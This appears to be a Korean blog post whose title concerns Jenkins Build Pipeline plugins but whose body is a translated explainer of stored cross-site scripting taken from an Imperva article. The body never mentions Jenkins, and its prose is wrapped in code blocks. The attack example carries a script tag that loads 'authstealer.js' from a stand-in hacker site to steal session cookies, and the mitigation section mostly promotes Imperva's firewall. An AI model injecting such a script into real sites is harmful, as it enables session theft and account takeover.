---
layout: post
Title:  "[Jenkins] Build PipeLine plugins의 사용을 꺼리게 되는 이유"
---

## 크로스 사이트 스크립팅 (XSS) 공격이란?
```cpp
크로스 사이트 스크립팅 (XSS)은 취약한 웹 애플리케이션에 악성 코드를 삽입하는 일반적인 공격 벡터입니다. XSS는 애플리케이션 자체를 직접 대상으로하지 않는다는 점에서 다른 웹 공격 벡터와 다릅니다. 대신 웹 애플리케이션의 사용자가 매우 취약합니다.

성공적인 크로스 사이트 스크립팅 공격은 온라인 비즈니스의 평판과 클라이언트와의 관계에 치명적인 결과를 초래할 수 있습니다.

공격의 심각도에 따라 사용자 계정이 손상되고 트로이 목마 프로그램이 활성화되고 페이지 내용이 수정되어 사용자가 기꺼이 개인 데이터를 포기하도록 오도 할 수 있습니다. 마지막으로 세션 쿠키가 공개되어 가해자가 유효한 사용자를 가장하고 개인 계정을 남용 할 수 있습니다.

교차 사이트 스크립팅 공격은 저장 및 반영의 두 가지 유형으로 나눌 수 있습니다.

영구 XSS라고도하는 저장된 XSS는 둘 중 더 큰 피해를줍니다. 취약한 웹 애플리케이션에 악성 스크립트가 직접 주입 될 때 발생합니다.

Reflected XSS는 웹 애플리케이션의 악성 스크립트를 사용자의 브라우저에 반영 하는 것을 포함합니다.
```
- - -

## What is stored cross site scripting
```cpp
저장된 XSS 공격을 성공적으로 실행하기 위해 가해자는 웹 애플리케이션에서 취약점을 찾은 다음 악성 스크립트를 서버에 삽입해야합니다.

가장 빈번한 대상 중 하나는 사용자가 블로그, 소셜 네트워크, 비디오 공유 플랫폼 및 게시판을 포함한 콘텐츠를 공유 할 수있는 웹 사이트입니다. 감염된 페이지를 볼 때마다 악성 스크립트가 피해자의 브라우저로 전송됩니다.
```
- - -

## 저장된 XSS 공격 예
```cpp
전자 상거래 웹 사이트를 탐색하는 동안 가해자는 사이트의 댓글 섹션에 HTML 태그를 삽입 할 수있는 취약점을 발견합니다. 삽입 된 태그는 페이지의 영구적 인 기능이되어 페이지가 열릴 때마다 브라우저가 나머지 소스 코드로 태그를 구문 분석합니다.

공격자는 다음과 같은 코멘트를 추가합니다 :  훌륭한 아이템에 대한 훌륭한 가격! 여기 <script src =”http://hackersite.com/authstealer.js”> </ script>에서 내 리뷰를 읽어보십시오 .

이 시점부터 페이지에 액세스 할 때마다 댓글의 HTML 태그가 다른 사이트에서 호스팅되는 JavaScript 파일을 활성화하고 방문자의 세션 쿠키를 훔칠 수 있습니다.

세션 쿠키를 사용하여 공격자는 방문자의 계정을 손상시켜 개인 정보 및 신용 카드 데이터에 쉽게 액세스 할 수 있습니다. 한편 댓글 섹션으로 스크롤을 내려 본 적이없는 방문자는 공격이 발생했음을 알지 못합니다.

링크를 클릭 한 후 스크립트가 활성화되는 반사 공격과 달리 저장된 공격은 피해자가 손상된 웹 페이지를 방문하기 만하면됩니다. 이것은 공격의 범위를 증가시켜 경계 수준에 관계없이 모든 방문자를 위험에 빠뜨립니다.

가해자의 관점에서 영구 XSS 공격은 트래 피킹 된 웹 사이트와 영구 스크립트 삽입을 가능하게하는 취약성이있는 웹 사이트를 모두 찾는 데 어려움이 있기 때문에 상대적으로 실행하기가 더 어렵습니다.
```
- - -

## 저장된 XSS 공격 방지 / 완화
```cpp
WAF (웹 애플리케이션 방화벽)는 XSS 및 웹 애플리케이션 공격으로부터 보호하기 위해 가장 일반적으로 사용되는 솔루션입니다.

WAF는 공격 벡터에 대응하기 위해 다른 방법을 사용합니다. XSS의 경우 대부분은 악성 요청을 식별하고 차단하기 위해 서명 기반 필터링에 의존합니다.

업계 모범 사례에 따라 Imperva의 클라우드  웹 애플리케이션 방화벽  은 교차 사이트 스크립팅 공격에 대응하기 위해 서명 필터링도 사용합니다.

Imperva 클라우드 WAF는 새로 발견 된 공격 벡터의 서명으로 보안 규칙 세트를 지속적으로 업데이트하는 보안 전문가 팀이 정기적으로 유지 관리하는 관리 형 서비스로 제공됩니다.

Imperva 크라우드 소싱 기술은 모든 고객의 이익을 위해 네트워크 전체에서 공격 데이터를 자동으로 수집하고 집계합니다.

크라우드 소싱 접근 방식을 사용하면 제로 데이 위협에 매우 빠르게 대응할 수 있으므로 단일 공격 시도가 식별되는 즉시 전체 사용자 커뮤니티를 새로운 위협으로부터 보호 할 수 있습니다.

크라우드 소싱은 또한 여러 가해자가 재사용하는 경향이있는 봇넷 리소스를 포함하여 반복되는 범죄자를 차단하는 IP 평판 시스템을 사용할 수있게합니다.
```
- - -

- 참조
https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/
